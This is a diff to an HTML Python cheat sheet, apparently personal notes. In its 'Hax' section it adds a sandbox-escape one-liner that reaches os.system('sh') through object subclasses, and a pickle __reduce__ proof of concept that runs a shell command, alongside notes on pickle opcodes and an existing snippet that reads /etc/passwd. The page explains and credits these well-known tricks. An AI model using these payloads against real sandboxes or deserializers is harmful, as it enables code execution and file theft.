@@ -186,6 +186,8 @@ password = getpass.getpass()</pre>
 <pre>import time
 time.sleep(0.5) # 0.5 seconds</pre>
 <h3>Hax</h3>
+<pre>[t for t in().__class__.__base__.__subclasses__()if'Sized'==t.__name__][0].__len__.__globals__['__builtins__']['__import__']('os').system('sh')</pre>
+<p>(most modern variation, <a href="https://nedbatchelder.com/blog/201302/finding_python_3_builtins.html">Eryksun via Ned Batchelder</a>)</p>
 <pre>[t for t in (1).__class__.__bases__[-1].__subclasses__() if t.__name__ == 'file'][0]('/etc/passwd').read()</pre>
 <p>(from <a href="http://eev.ee/blog/2012/03/24/on-principle/"><cite>On principle</cite> (eevee)</a>)</p>
 <p>Want a shell instead?</p>
@@ -199,6 +201,18 @@ time.sleep(0.5) # 0.5 seconds</pre>
 <pre>type(lambda: 0)(type((lambda: 0).__code__)(
     1,0,1,1,67,b'|\0\202\1\0',(),(),('x',),'','',1,b''),{}
 )(Exception())</pre>
+<pre>
+import pickle
+class RCE:
+    def __reduce__(self): return os.system, ("echo 'hi'",)
+print(pickle.loads(pickle.dumps(RCE())))
+</pre>
+<a href="https://docs.python.org/3/library/pickletools.html">pickletools</a> (go to source). The most interesting opcodes are:
+<ul>
+	<li><code>R</code> = REDUCE: take a callable and a tuple of args from stack, call it</li>
+	<li><code>c</code> = GLOBAL: take two strings as argument (not from stack), <code>self.find_class(modname, name)</code> &approx; <code>getattr(sys.modules[modname], name)</code> with compatiblity shims and (if protocol &ge; 4) splitting <code>name</code> by <code>.</code></li>
+	<li><code>\x93</code> = STACK_GLOBAL: take two strings from stack, <code>self.find_class(modname, name)</code></li>
+</ul>
 <h3>pygmentize</h3>
 <p>has complicated command line flags:</p>
 <pre>pygmentize -f html -l python -O full,style=tango -o out.html src.py</pre>
